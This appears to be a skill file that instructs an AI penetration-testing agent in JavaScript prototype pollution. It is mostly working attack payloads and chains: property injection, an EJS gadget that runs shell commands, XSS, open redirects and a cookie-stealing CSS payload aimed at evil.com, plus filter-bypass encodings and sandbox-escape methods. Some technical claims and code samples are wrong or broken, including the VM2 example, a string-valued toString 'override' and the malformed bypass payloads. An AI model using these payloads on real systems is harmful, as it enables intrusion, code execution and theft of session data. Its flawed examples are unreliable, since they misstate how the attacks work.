---
name: prototype-pollution
description: "JavaScript prototype pollution exploitation for property injection, sandbox escape, and RCE chains"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["prototype pollution", "__proto__", "constructor prototype", "object pollution", "javascript prototype", "merge pollution", "deep merge vulnerability", "clone pollution", "property injection", "sandbox escape prototype"]
contextBoosts: [api]
mitreAttack: ["T1190", "T1059.007"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection"]
---

# Prototype Pollution Attack Skill

## 1. When to Use / Do Not Use

### Use Prototype Pollution when:
- Target uses JavaScript/Node.js and performs deep merge, clone, or extend operations on user-controlled objects
- You can send JSON payloads with nested `__proto__` or `constructor` keys
- The application merges objects with `Object.assign`, `lodash.merge`, `deepmerge`, `cloneDeep`, or spread operators
- You observe server-side property copying behavior that reflects injected properties
- The application uses template engines (EJS, Pug, Handlebars) that may render injected properties
- Target runs in a sandboxed environment (VM2, isolated-vm, restricted Node.js) where prototype pollution enables escape
- You need to escalate from property injection to XSS, open redirect, or RCE via downstream sinks

### Do NOT use when:
- Target parses JSON but never merges or clones user-controlled input into existing objects
- Application uses `Object.create(null)` for all user-facing maps (no prototype chain)
- Input is validated against a strict schema that rejects `__proto__`, `constructor`, and `prototype` keys
- The merge operation uses `Map` or `Set` instead of plain objects
- Target runs in environments without dangerous sinks (no `eval`, no template rendering, no file operations)
- You have no ability to inject JSON objects into the application

### Quick Decision Tree:
```
Can you control JSON input?
├── No → Prototype pollution not applicable via HTTP
└── Yes → Does the app merge/clone/extend your input?
    ├── No → No pollution vector
    └── Yes → Can you inject __proto__ or constructor properties?
        ├── No → Filter is effective, escalate to other vectors
        └── Yes → Test pollution → Verify property injection → Chain to XSS/redirect/RCE
```

## 2. Auth Context

### Prototype Pollution Authentication Requirements:
- **Unauthenticated endpoints**: Any API that accepts JSON and performs deep merge is exploitable without authentication
- **Authenticated endpoints**: If merge operations occur on authenticated data (user profiles, preferences, settings), authentication is required to reach the sink
- **Admin-only merge**: Some applications allow only admins to import/merge JSON (template imports, bulk updates) — authenticated exploitation only
- **Cookie-based state**: If merged objects come from cookies (e.g., shopping cart, user prefs), attacker can poison via cookie injection
- **SSO/OAuth flows**: Token payloads merged into session objects may be exploitable via JWT claims injection

### Auth-Aware Strategy:
```
1. Identify merge endpoints (POST/PUT/PATCH with JSON body)
2. Test without authentication first — unauthenticated RCE is Critical
3. If auth required, capture authenticated traffic and test merge in authenticated context
4. Check if cookie values are merged into objects — cookie poisoning is unauthenticated
5. Verify pollution persists across sessions (Object.prototype is global)
```

## 3. Basic Prototype Pollution

### Core Concept:
In JavaScript, all objects inherit from `Object.prototype`. When a property is set on `Object.prototype`, it becomes available on every object in the runtime. Deep merge operations that recursively copy user-controlled properties can inadvertently write to `__proto__`, poisoning the prototype.

### Vulnerable Merge Patterns:

**`Object.assign` (shallow — not directly vulnerable):**
```javascript
// Object.assign does NOT traverse __proto__ — it copies own enumerable properties
Object.assign({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))
// Result: { "__proto__": { isAdmin: true } } — own property, NOT prototype pollution
```
Note: `Object.assign` is safe against `__proto__` pollution because it only copies own properties. However, it IS vulnerable to pollution via `constructor.prototype` if the target object has a mutable constructor.

**`lodash.merge` / `lodash.defaultsDeep` (vulnerable):**
```javascript
const _ = require('lodash');
const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
_.merge({}, payload);
// Object.prototype.isAdmin === true — ALL objects now have isAdmin
```

**`deepmerge` npm package (vulnerable in older versions):**
```javascript
const merge = require('deepmerge');
const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
merge({}, payload);
// Prototype polluted
```

**Manual recursive merge (vulnerable):**
```javascript
function deepMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = deepMerge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
// Attacker sends: {"__proto__": {"isAdmin": true}}
// deepMerge writes to Object.prototype.isAdmin
```

**Spread operator with nesting (NOT vulnerable):**
```javascript
const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
const result = { ...payload };
// result.__proto__ is a regular own property — no prototype pollution
```

### The `__proto__` Key Mechanism:
When JavaScript parses `{"__proto__":{"isAdmin":true}}`, the `__proto__` key is treated specially in object literal syntax. However, when processed by `JSON.parse()`, it becomes a regular string key. Vulnerable merge functions that check `key === '__proto__'` or access `obj[key]` recursively can write to the actual prototype chain.

## 4. Detection

### Basic Detection Payload:
```json
{"__proto__":{"pollutedTest":"pp-20260706"}}
```

### Detection Methodology:

**Step 1: Inject and verify property existence:**
```
# Send pollution payload
POST /api/merge HTTP/1.1
Content-Type: application/json

{"__proto__":{"pollutedTest":"pp-20260706"}}

# Then check if the property exists on new objects
# Via a separate request that checks object properties:
GET /api/check?prop=pollutedTest HTTP/1.1
# Or via DOM: evaluateRendered → document.createElement('div').pollutedTest
```

**Step 2: Verify via JavaScript evaluation:**
```javascript
// In browser console or via evaluateRendered
({}).pollutedTest === "pp-20260706"
// If true → prototype is polluted
// If undefined → pollution failed
```

**Step 3: Confirm persistence:**
```javascript
// Create fresh objects and check
const a = {};
const b = new Object();
a.pollutedTest // "pp-20260706" if polluted
b.pollutedTest // "pp-20260706" if polluted
```

### Detection Heuristics:
1. Send unique test string: `{"__proto__":{"pp_detect_<timestamp>":"value"}}` — if property appears on new objects, pollution confirmed
2. Check response for merge behavior: does the server merge your input into an existing object and return the result?
3. Test both `__proto__` and `constructor.prototype` vectors — some filters block one but not the other
4. Use timing: merge operations on polluted prototypes may take longer due to prototype chain traversal
5. Check for error messages referencing prototype or `__proto__` in stack traces

### Common Entry Points:
| Endpoint Pattern | Merge Surface | Likelihood |
|---|---|---|
| `POST /api/settings` | User preferences merged into defaults | High |
| `POST /api/import` | JSON import merged into config | High |
| `PUT /api/profile` | Profile fields merged into user object | Medium |
| `POST /api/merge` | Explicit merge endpoint | Very High |
| `POST /api/template` | Template variables merged | Medium |
| Cookie values | Session data merged into app state | Medium |
| WebSocket messages | Real-time data merged into state | Medium |

## 5. Exploitation Chains

### XSS via `innerHTML` Sink:
When prototype-polluted properties flow into `innerHTML` assignments:

```json
{"__proto__":{"innerHTML":"<img src=x onerror=alert(document.domain)>"}}
```

**Trigger chain:**
1. Pollute `Object.prototype.innerHTML` with XSS payload
2. Application renders a component that reads `.innerHTML` from a user-controlled object
3. DOM renders the XSS payload

**Verification:**
```javascript
// After polling, create a test object
const test = {};
test.innerHTML // "<img src=x onerror=alert(document.domain)>"
// If this flows to DOM innerHTML assignment, XSS fires
```

### XSS via Template Rendering:

**EJS template exploitation:**
```json
{"__proto__":{"settings":{"outputFunctionName":";require('child_process').execSync('id')//"}}}
```

EJS reads `options.settings.outputFunctionName` from the template context. If prototype-polluted, it injects code into the template function.

**Pug (Jade) exploitation:**
```json
{"__proto__":{"settings":{"doctype":"html"}}}
```

Pug reads `settings.doctype` from the context — pollution can alter template behavior.

**Handlebars exploitation:**
```json
{"__proto__":{"proto":{"lookup":true}}}
```

Handlebars uses prototype lookup — pollution can bypass sandbox restrictions.

### Open Redirect via URL Properties:

```json
{"__proto__":{"url":"https://evil.com","redirectUrl":"https://evil.com","returnUrl":"https://evil.com"}}
```

**Trigger chain:**
1. Pollute `Object.prototype.url` or `redirectUrl`
2. Application checks `req.query.url || defaults.url` — prototype provides poisoned value
3. Redirect fires: `response.redirect(target.url)` → attacker-controlled destination

**Alternative property names:**
- `url`, `redirectUrl`, `returnUrl`, `next`, `destination`, `location`, `href`, `target`
- Test each: many frameworks use specific property names for redirect logic

### CSS Injection via `style` Property:
```json
{"__proto__":{"style":"background:url(https://evil.com/steal?cookie="+document.cookie+")"}}
```

If `element.style` or CSS object properties are populated from user-controlled objects, this can leak data.

## 6. Constructor Prototype Pollution

### `constructor.prototype` Vector:
When `__proto__` is filtered, use `constructor.prototype` as an alternative:

```json
{"constructor":{"prototype":{"isAdmin":true}}}
```

**How it works:**
1. Every object has a `constructor` property pointing to its constructor function
2. `constructor.prototype` is the same object as `__proto__`
3. Writing to `constructor.prototype.isAdmin` pollutes the prototype just like `__proto__`

### Filter Bypass with `constructor`:
```
# If server blocks __proto__:
{"constructor":{"prototype":{"isAdmin":true}}}

# If server blocks both __proto__ and constructor:
# Use nested array/object pollution:
[{"constructor":{"prototype":{"isAdmin":true}}}]
```

### `constructor` in Merge Operations:
```javascript
// Vulnerable merge recursively copies constructor properties
const payload = {
  "constructor": {
    "prototype": {
      "innerHTML": "<script>alert(1)</script>"
    }
  }
};
_.merge({}, payload);
// Object.prototype.innerHTML is now polluted
```

### Detection for Constructor Vector:
```javascript
// Send payload, then check:
({}).isAdmin === true
// or
{}.constructor.prototype.isAdmin === true
```

## 7. Node.js / Express

### `qs` Library Pollution:
The `qs` library (used by Express for query string parsing) has known prototype pollution vectors:

```javascript
// Express default body parser + qs = pollution via query string
// GET /api/settings?__proto__[isAdmin]=true
// If app does: Object.assign(defaults, req.query) → prototype polluted
```

**Exploitation:**
```
GET /api/settings?__proto__[isAdmin]=true HTTP/1.1
→ Express parses query: { __proto__: { isAdmin: true } }
→ Object.assign merges into defaults
→ Object.prototype.isAdmin === true
```

**`qs` specific vectors:**
```
# Bracket notation in query string
?__proto__[polluted]=value
?constructor[prototype][polluted]=value

# Nested pollution
?data[__proto__][isAdmin]=true
?options[constructor][prototype][isAdmin]=true
```

### Body Parser Exploitation:
```http
POST /api/merge HTTP/1.1
Content-Type: application/json

{"__proto__":{"isAdmin":true,"role":"admin"}}
```

**Common vulnerable patterns in Express:**
```javascript
// Pattern 1: Direct merge
app.post('/settings', (req, res) => {
  Object.assign(app.settings, req.body); // POLLUTED
});

// Pattern 2: Lodash merge
app.post('/import', (req, res) => {
  _.merge(config, req.body); // POLLUTED
});

// Pattern 3: Recursive copy
app.put('/profile', (req, res) => {
  for (const key in req.body) {
    user[key] = req.body[key]; // POLLUTED if req.body has __proto__
  }
});
```

### Express-Specific Detection:
1. Send `{"__proto__":{"polluted":"test"}}` to POST endpoints accepting JSON
2. Check if new objects created by the server inherit the polluted property
3. Test query string pollution: `?__proto__[polluted]=test` on GET endpoints
4. Check for `qs` version — `qs` < 6.5.3, < 6.4.1, < 6.3.2 are vulnerable to prototype pollution
5. Test `body-parser` versions < 1.18.3 — known pollution vectors

### Server-Side Template Injection via Prototype Pollution:
```javascript
// If Express app uses EJS and renders user data
app.get('/render', (req, res) => {
  res.render('template', { ...req.query });
});

// Attack:
GET /render?settings[outputFunctionName]=x;process.mainModule.require('child_process').execSync('id')//
// Prototype pollution → EJS code execution
```

## 8. Sandbox Escape

### VM2 Sandbox Escape:
VM2 isolates JavaScript execution but prototype pollution can escape:

```javascript
const vm = require('vm');
const sandbox = { alert: console.log };
vm.createContext(sandbox);

// Prototype pollution payload:
const payload = {
  "__proto__": {
    "__defineGetter__": function(prop, fn) {
      // This code runs in the host context
      const result = fn();
      return result;
    }
  }
};
```

**Escape chain:**
1. Pollute `Object.prototype` with a getter that executes in host context
2. Sandbox code accesses a property triggering the getter
3. Getter function runs outside the sandbox
4. Achieve RCE via `process.mainModule.require('child_process').execSync('cmd')`

### `Object.prototype.ISPrototypeOf` Override:
```json
{"__proto__":{"ISPrototypeOf":true}}
```

**Mechanism:**
1. Override `ISPrototypeOf` on the prototype
2. Code that checks `Object.prototype.ISPrototypeOf.call(a, b)` gets poisoned
3. Security checks relying on prototype chain inspection fail
4. Sandbox assumes object is legitimate → escapes sandbox restrictions

### `toString` Method Override:
```json
{"__proto__":{"toString": "() => { require('child_process').execSync('id'); return '' }"}}
```

**Mechanism:**
1. Override `Object.prototype.toString` with a function that executes code
2. Any string coercion in the sandbox triggers the function
3. `console.log(obj)` → `toString()` called → code executes in host context

### `valueOf` Method Override:
```json
{"__proto__":{"valueOf": "() => ({hack: true})"}}
```

**Mechanism:**
1. Override `Object.prototype.valueOf`
2. Any numeric or string comparison triggers `valueOf`
3. Type coercion chains can bypass sandbox checks

### Symbol Pollution for Sandbox Escape:
```json
{"__proto__":{"Symbol.toPrimitive": "function(hint) { return 42; }"}}
```

### Escape Verification:
```javascript
// After pollution, create sandbox code that triggers the getter/method
// If sandbox crashes or returns host-context data, escape confirmed
// Document: what property triggered the escape, what code executed
```

## 9. Client-Side Exploitation

### DOM Clobbering + Prototype Pollution:
Combine DOM clobbering with prototype pollution for enhanced exploitation:

**Step 1: Poison prototype with DOM sink properties:**
```json
{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>","src":"https://evil.com/steal.js"}}
```

**Step 2: Trigger DOM clobbering that reads polluted properties:**
```html
<a id=foo name=innerHTML><b>test</b></a>
```

**Step 3: Application reads `element.innerHTML` from clobbered DOM + poisoned prototype:**
```javascript
const el = document.getElementById('foo');
// el.innerHTML returns the polluted value from prototype
// → XSS fires
```

### localStorage Poisoning:
```json
{"__proto__":{"localStorage":{"admin":true,"token":"stolen"}}}
```

**Trigger chain:**
1. Pollute `Object.prototype.localStorage` with attacker-controlled data
2. Application checks `window.localStorage || defaults` — prototype provides poisoned value
3. Application trusts poisoned localStorage data for auth decisions

### Cookie Poisoning via Prototype:
```json
{"__proto__":{"cookie":"session=admin; path=/"}}
```

If the application reads `req.cookie` or merges cookies into objects, this can override authentication state.

### DOM Property Pollution for XSS:

**Common DOM sinks to test:**
- `element.innerHTML` — Direct HTML injection
- `element.outerHTML` — HTML injection replacing element
- `element.setAttribute('onclick', ...)` — Event handler injection
- `element.src` — Script/iframe loading from attacker domain
- `element.href` — Navigation or resource loading
- `element.style` — CSS injection for data exfiltration
- `element.action` — Form submission to attacker URL
- `element.method` — Change form method to GET for data leakage

### Client-Side Detection:
```javascript
// In browser console:
const test = {};
test.pollutedTest = undefined; // Should not affect prototype
({}).pollutedTest // If "value" → prototype polluted

// Or check specific properties:
({}).isAdmin // true if polluted
({}).innerHTML // check for XSS payload
({}).constructor.prototype.pollutedTest // confirms prototype pollution
```

## 10. Filter Bypass

### Blocked Keywords and Alternatives:

| Blocked | Bypass Alternative | Payload |
|---|---|---|
| `__proto__` | `constructor.prototype` | `{"constructor":{"prototype":{"key":"value"}}}` |
| `__proto__` | `__defineGetter__` | Use property getter to trigger code on access |
| `constructor` | `constructor` via array | `[{"constructor":{"prototype":{"key":"value"}}}]` |
| `prototype` | `__proto__` (if only constructor blocked) | `{"__proto__":{"key":"value"}}` |
| `isAdmin` | `role`, `admin`, `privilege`, `权限` | `{"__proto__":{"role":"admin"}}` |
| `true` | `1`, `"true"`, non-empty string | `{"__proto__":{"isAdmin":"1"}}` |
| `{` `}` | Array wrapping | `[{"__proto__":{"key":"value"}}]` |
| `:` | Unicode full-width colon `：` | `{"__proto__"："{"isAdmin"：true}"}` |

### Encoding Bypass:

**Unicode escape sequences:**
```json
{"\u005f\u005fproto\u005f\u005f":{"isAdmin":true}}
```

**Double URL encoding:**
```
%255f%255fproto%255f%255f[isAdmin]=true
```

**Null byte injection:**
```
{"__proto__\x00":{"isAdmin":true}}
```

**Key name variations:**
```json
{"_proto_":{"isAdmin":true}}
{"__Proto__":{"isAdmin":true}}
{"__PROTO__":{"isAdmin":true}}
{"__proto ":{"isAdmin":true}}
```

### Nested Pollution Bypass:
```json
{"a":{"__proto__":{"isAdmin":true}}}
{"a":{"b":{"__proto__":{"isAdmin":true}}}}
{"constructor":{"prototype":{"__proto__":{"isAdmin":true}}}}
```

### Array-Based Pollution:
```json
[{"__proto__":{"isAdmin":true}}]
{"data":[{"__proto__":{"isAdmin":true}}]}
{"items":"[{\"__proto__\":{\"isAdmin\":true}}]"}
```

### JSONP Callback Bypass:
```
GET /api/callback?data={"__proto__":{"isAdmin":true}} HTTP/1.1
```
If the server includes JSONP callback wrapping, the pollution payload may be processed differently.

## 11. Anti-Hallucination

### Verification Rules:

1. **Do not claim prototype pollution without proof** — you must show that a property injected via `__proto__` or `constructor.prototype` actually appears on objects created AFTER the pollution payload was sent

2. **Do not assume merge functions are vulnerable** — verify the merge implementation by checking if the polluted property persists on new objects. `Object.assign` is NOT vulnerable to `__proto__` pollution; only recursive deep merge functions are

3. **Do not claim "all objects are polluted" without testing** — create multiple fresh objects after pollution and verify each inherits the injected property: `({}).pollutedKey`, `(new Object()).pollutedKey`, `{}.pollutedKey`

4. **Do not fabricate XSS/redirect/RCE chains without evidence** — you must show the actual chain: (a) pollution sent, (b) property confirmed on prototype, (c) sink function called with polluted property, (d) resulting XSS redirect or code execution observed

5. **Do not assume `constructor.prototype` bypass works** — some frameworks specifically filter `constructor` in addition to `__proto__`. Test both vectors independently

6. **Do not claim "Node.js RCE" from prototype pollution alone** — prototype pollution is property injection; RCE requires a specific downstream sink (`child_process.exec`, `eval`, template compilation, file write). Document the exact sink and the code path that triggers it

7. **Do not confuse prototype pollution with prototype pollution gadgets** — Basic pollution only injects properties. Gadgets (downstream code that uses polluted properties for dangerous operations) are what enable XSS, RCE, and sandbox escape. Both must be demonstrated

8. **Do not claim "sandbox escape" without proof** — you must show that code executing outside the sandbox context was triggered by the pollution payload. Verify: what method was overridden, what code triggered it, what host-context code executed

### Evidence Requirements:

- **Pollution evidence**: `({}).pollutedKey === "expected_value"` returning `true` after payload sent
- **Sink evidence**: The exact code path that consumes the polluted property (e.g., `element.innerHTML = userInput.innerHTML`)
- **Impact evidence**: XSS alert, redirect to attacker domain, command output, or sandbox escape demonstrated
- **Persistence evidence**: Polluted property survives garbage collection and affects objects created after pollution
- **Chain evidence**: Complete flow from HTTP request → merge operation → prototype pollution → sink trigger → security impact

### Verification Protocol:
```
# Step 1: Baseline
GET /api/check → Note: ({}) has no custom properties

# Step 2: Send pollution payload
POST /api/merge
{"__proto__":{"pp_verify":"CONFIRMED_20260706"}}

# Step 3: Verify pollution
GET /api/check
→ Evaluate: ({}).pp_verify === "CONFIRMED_20260706"
→ If true → pollution confirmed

# Step 4: Test sink
→ If innerHTML sink: evaluateRendered → ({}).innerHTML
→ If redirect sink: check if ({}).url / ({}).redirectUrl flows to redirect
→ If template sink: trigger template rendering with polluted context

# Step 5: Document
- Pollution payload sent (full HTTP request)
- Verification result (object property check)
- Sink trigger (exact code path)
- Security impact (XSS alert, redirect, command output)
```

### Common False Positives:
- Property exists as own property on specific object (not prototype pollution)
- Server reflects input without merge (stored XSS, not prototype pollution)
- Client-side only pollution (no server-side impact unless RCE achieved)
- Pollution in test environment but not production (different merge libraries)
- `Object.assign` result mistaken for prototype pollution (shallow copy, not deep merge)
